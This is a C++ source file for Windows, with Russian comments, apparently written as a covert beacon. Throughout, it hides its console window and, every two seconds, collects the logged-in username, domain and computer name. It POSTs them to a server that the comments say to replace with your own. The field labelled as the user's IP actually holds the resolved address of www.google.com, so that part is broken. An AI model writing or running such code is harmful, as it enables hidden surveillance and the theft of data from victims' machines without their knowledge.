
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream> 
#include <string> 
#include <vector> 
#include <fstream> 
#include <windows.h>
#include <gdiplus.h>

#pragma comment(lib, "Ws2_32.lib")


void sendHttpPost(const std::string& server, const std::string& port, const std::string& name, const std::string& domain, const std::string& machine, const std::string& ip) {
  
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed" << std::endl;
        WSACleanup();
        return;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(std::stoi(port));
    inet_pton(AF_INET, server.c_str(), &serverAddr.sin_addr);

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed" << std::endl;
        closesocket(sock);
        WSACleanup();
        return;
    }

    std::string postData = "name=" + name + "&domain=" + domain + "&machine=" + machine + "&ip=" + ip;
    std::string request = "POST /info HTTP/1.1\r\n";
    request += "Host: " + server + "\r\n";
    request += "Content-Type: application/x-www-form-urlencoded\r\n";
    request += "Content-Length: " + std::to_string(postData.length()) + "\r\n";
    request += "Connection: close\r\n\r\n";
    request += postData;

    send(sock, request.c_str(), request.length(), 0);

    closesocket(sock);
    WSACleanup();
}


std::string server = "127.0.0.1"; // Замените на адрес вашего сервера
std::string port = "54653"; // Замените на нужный порт
std::string nameUser = "John Doe"; // Имя для отправки
std::string domainUser = "000"; // Имя для отправки
std::string machineUser = "Old"; // Имя для отправки
std::string ipUser = "192.168.1.1"; // IP-адрес 

void data() {
    system("echo %username% > cache.txt"); // Записываем в файл вывод echo
    std::ifstream cacheFile("cache.txt");
    std::string userName; // Здесь будет имя пользователя
    getline(cacheFile, userName);
    nameUser = userName;
    system("del cache.txt"); // Не мусорим!

    char domainName[255];
    DWORD domainName_len = sizeof(domainName);
    GetComputerNameExA(ComputerNameDnsDomain, domainName, &domainName_len);
    domainUser = domainName;

    char machineName[256];
    DWORD size = sizeof(machineName);
    GetComputerNameA(machineName, &size);
    machineUser = machineName;

    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
    }

    // Prepare hints for getaddrinfo
    struct addrinfo hints;
    struct addrinfo* res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET; // For IPv4
    hints.ai_socktype = SOCK_STREAM;

    // Get address info
    const char* hostname = "www.google.com";
    result = getaddrinfo(hostname, NULL, &hints, &res);
    if (result != 0) {
        std::cerr << "getaddrinfo failed: " << gai_strerror(result) << std::endl;
        WSACleanup();
    }

    // Use the results (for demonstration, just print the first address)
    char ipstr[INET_ADDRSTRLEN];
    struct sockaddr_in* ipv4 = (struct sockaddr_in*)res->ai_addr;
    inet_ntop(res->ai_family, &(ipv4->sin_addr), ipstr, sizeof(ipstr));
    std::cout << "IP address: " << ipstr << std::endl;
    ipUser = ipstr;
    // Clean up
    freeaddrinfo(res);
    WSACleanup();
}

void workMain() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    data();
    sendHttpPost(server, port, nameUser, domainUser, machineUser, ipUser);
}

int main() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    while (true) {
        workMain();
        Sleep(2000);
    }
    return 0;
}